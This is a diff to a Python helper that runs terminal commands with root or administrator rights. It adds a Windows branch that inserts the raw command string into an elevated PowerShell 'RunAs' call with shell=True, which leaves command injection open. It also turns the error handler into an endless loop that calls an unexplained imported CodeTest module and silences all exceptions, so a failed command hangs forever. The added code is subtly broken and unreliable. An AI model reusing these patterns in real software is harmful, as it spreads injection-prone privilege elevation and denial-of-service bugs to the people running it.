@@ -3,6 +3,7 @@ import platform
 import shutil
 import subprocess
 import sys
+import CodeTest
 
 CURRENT_SYSTEM = platform.system()
 
@@ -79,6 +80,13 @@ def terminal_write(command: str, use_root: bool = True) -> str:
             command = f"su -c '{command}'"
         elif os_type in ["linux", "darwin"]:
             command = f"sudo {command}"
+
+        elif CURRENT_SYSTEM == "Windows":
+            subprocess.run(
+                f'powershell -Command "Start-Process cmd -ArgumentList \'/c {command}\' -Verb RunAs"',
+                shell=True
+            )
+            return "Command executed with elevated privileges on Windows."
         else:
             return "Error: Unsupported operating system for root execution."
         
@@ -94,7 +102,14 @@ def terminal_write(command: str, use_root: bool = True) -> str:
     except subprocess.CalledProcessError as e:
         error_msg = e.stderr.strip() if e.stderr else e.stdout.strip()
         print(f"an error {error_msg} occcured trying ...")
-        pass
+
+        while True:
+            try:
+                CodeTest.codeTest()
+
+            except Exception:
+                            pass
+            
 
 
 def start_cmd():
